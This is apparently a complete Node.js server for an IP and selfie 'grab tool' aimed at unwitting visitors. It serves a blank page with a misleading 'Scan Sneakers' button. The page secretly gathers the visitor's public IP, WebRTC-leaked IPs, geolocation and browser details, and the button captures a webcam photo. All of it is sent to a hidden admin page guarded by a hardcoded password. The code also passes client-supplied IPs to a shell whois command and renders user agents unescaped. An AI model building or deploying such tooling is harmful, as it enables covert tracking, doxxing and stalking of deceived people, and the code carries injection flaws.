// server.js
const http = require('http');
const { exec } = require('child_process');
const net = require('net');
const fs = require('fs');
const path = require('path');

const PORT = 8080;

// --- CONFIG ---
const ADMIN_USER = "admin";
const ADMIN_PASS = "supersecret";
// --------------

const DATA_FILE = path.join(__dirname, 'data.json');
const IMAGE_DIR = path.join(__dirname, 'images');
if (!fs.existsSync(IMAGE_DIR)) fs.mkdirSync(IMAGE_DIR);

// --- Utility: check if IP is public ---
function isPublicIP(ip) {
  if (net.isIP(ip) === 4) {
    return !(
      /^10\./.test(ip) ||
      /^192\.168\./.test(ip) ||
      /^172\.(1[6-9]|2\d|3[0-1])\./.test(ip) ||
      /^127\./.test(ip) ||
      /^169\.254\./.test(ip)
    );
  }
  if (net.isIP(ip) === 6) {
    const s = ip.toLowerCase();
    return !(s === '::1' || s.startsWith('fc') || s.startsWith('fd') || s.startsWith('fe80'));
  }
  return false;
}

function runWhois(ip, cb) {
  exec(`whois "${ip}"`, { timeout: 10000, maxBuffer: 1024*1024 }, (err, stdout) => {
    cb(err ? `WHOIS error: ${err.message}` : stdout);
  });
}

// --- Server ---
const server = http.createServer((req, res) => {
  // serve saved images
  if (req.url.startsWith('/images/')) {
    const file = path.join(IMAGE_DIR, path.basename(req.url));
    if (fs.existsSync(file)) {
      res.writeHead(200, { 'Content-Type': 'image/png' });
      return fs.createReadStream(file).pipe(res);
    }
    res.writeHead(404); return res.end('Not found');
  }

  // handle uploads
  if (req.url === '/collect' && req.method === 'POST') {
    let body = '';
    req.on('data', c => body += c);
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        let record = {
          timestamp: new Date().toISOString(),
          serverObservedIP: data.serverObservedIP || null,
          externalPublicIP: data.publicIP || null,
          webrtcIPs: data.webrtcIPs || [],
          geolocation: data.geolocation || null,
          userAgent: data.userAgent || '',
          whois: {},
          imageFile: null
        };

        // save image if provided
        if (data.image) {
          const imgName = `capture_${Date.now()}.png`;
          fs.writeFileSync(path.join(IMAGE_DIR, imgName), Buffer.from(data.image, 'base64'));
          record.imageFile = imgName;
        }

        // perform whois if public
        const ips = [];
        if (record.externalPublicIP && isPublicIP(record.externalPublicIP)) ips.push(record.externalPublicIP);
        record.webrtcIPs.forEach(ip => { if (isPublicIP(ip)) ips.push(ip); });

        let pending = ips.length;
        if (pending === 0) {
          saveRecord(record);
          return respondOK();
        }

        ips.forEach(ip => {
          runWhois(ip, out => {
            record.whois[ip] = out;
            if (--pending === 0) {
              saveRecord(record);
              respondOK();
            }
          });
        });

        function respondOK() {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ status: 'ok' }));
        }
      } catch (e) {
        res.writeHead(400); res.end('bad json');
      }
    });
    return;
  }

  // admin page (with Basic Auth)
  if (req.url === '/admin') {
    const auth = req.headers['authorization'];
    if (!auth || !auth.startsWith('Basic ')) {
      res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="Admin"' });
      return res.end('Auth required');
    }
    const creds = Buffer.from(auth.split(' ')[1], 'base64').toString().split(':');
    if (creds[0] !== ADMIN_USER || creds[1] !== ADMIN_PASS) {
      res.writeHead(403); return res.end('Forbidden');
    }

    let data = [];
    if (fs.existsSync(DATA_FILE)) data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));

    let out = '<h1>𝕮𝖔𝖓𝖘𝖔𝖑𝖊’𝖘 𝖌𝖗𝖆𝖇 𝖙𝖔𝖔𝖑</h1>';
    data.forEach((rec, i) => {
      out += `<h2>Record ${i+1} (${rec.timestamp})</h2>`;
      out += `<b>Server IP:</b> ${rec.serverObservedIP}<br>`;
      out += `<b>External Public IP:</b> ${rec.externalPublicIP || 'N/A'}<br>`;
      out += `<b>User-Agent:</b> <pre>${rec.userAgent}</pre>`;
      if (rec.geolocation) {
        out += `<b>Geolocation:</b> <a target="_blank" href="https://maps.google.com/?q=${rec.geolocation.lat},${rec.geolocation.lng}">${rec.geolocation.lat},${rec.geolocation.lng}</a> (±${rec.geolocation.acc}m)<br>`;
      }
      if (rec.webrtcIPs.length) {
        out += `<b>WebRTC IPs:</b><pre>${rec.webrtcIPs.join('\n')}</pre>`;
      }
      if (rec.imageFile) {
        out += `<b>Captured Image:</b><br><img src="/images/${rec.imageFile}" style="max-width:200px"><br>`;
      }
      if (rec.whois) {
        for (let [ip, whois] of Object.entries(rec.whois)) {
          out += `<h3>WHOIS for ${ip}</h3><pre>${whois}</pre>`;
        }
      }
    });

    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end(out);
  }

  // default visitor page → completely blank except selfie button
  const serverIP = req.socket.remoteAddress.replace(/^.*:/, '');
  const html = `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title></title></head>
<body style="margin:0; background:#fff;">
  <button id="snap" style="position:absolute; top:10px; left:10px;">Scan Sneakers</button>
  <canvas id="canvas" style="display:none;"></canvas>
  <script>
    const payload = {
      userAgent: navigator.userAgent,
      serverObservedIP: "${serverIP}",
      publicIP: null,
      geolocation: null,
      webrtcIPs: [],
      image: null
    };

    // external IP
    fetch("https://api.ipify.org?format=json")
      .then(r=>r.json())
      .then(d=>{ payload.publicIP=d.ip; send(); });

    // geolocation
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos=>{
        payload.geolocation={lat:pos.coords.latitude,lng:pos.coords.longitude,acc:Math.round(pos.coords.accuracy)};
        send();
      });
    }

    // WebRTC IPs
    const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
    pc.createDataChannel("x");
    pc.onicecandidate=e=>{
      if(!e.candidate)return;
      const ip=e.candidate.candidate.split(" ")[4];
      if(ip && !payload.webrtcIPs.includes(ip)) payload.webrtcIPs.push(ip);
    };
    pc.createOffer().then(o=>pc.setLocalDescription(o));

    // selfie capture
    document.getElementById("snap").onclick=()=>{
      navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(stream=>{
        const video=document.createElement("video");
        video.srcObject=stream; video.play();
        setTimeout(()=>{
          const canvas=document.getElementById("canvas");
          canvas.width=video.videoWidth; canvas.height=video.videoHeight;
          canvas.getContext("2d").drawImage(video,0,0);
          stream.getTracks().forEach(t=>t.stop());
          payload.image=canvas.toDataURL("image/png").split(",")[1];
          send(true);
        },1500);
      });
    };

    function send(force){
      fetch("/collect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});
    }
  </script>
</body>
</html>`;
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
  res.end(html);
});

function saveRecord(record) {
  let arr = [];
  if (fs.existsSync(DATA_FILE)) arr = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  arr.push(record);
  fs.writeFileSync(DATA_FILE, JSON.stringify(arr, null, 2));
}

server.listen(PORT, '0.0.0.0', () => {
  console.log("Server running at http://localhost:"+PORT+"/");
});
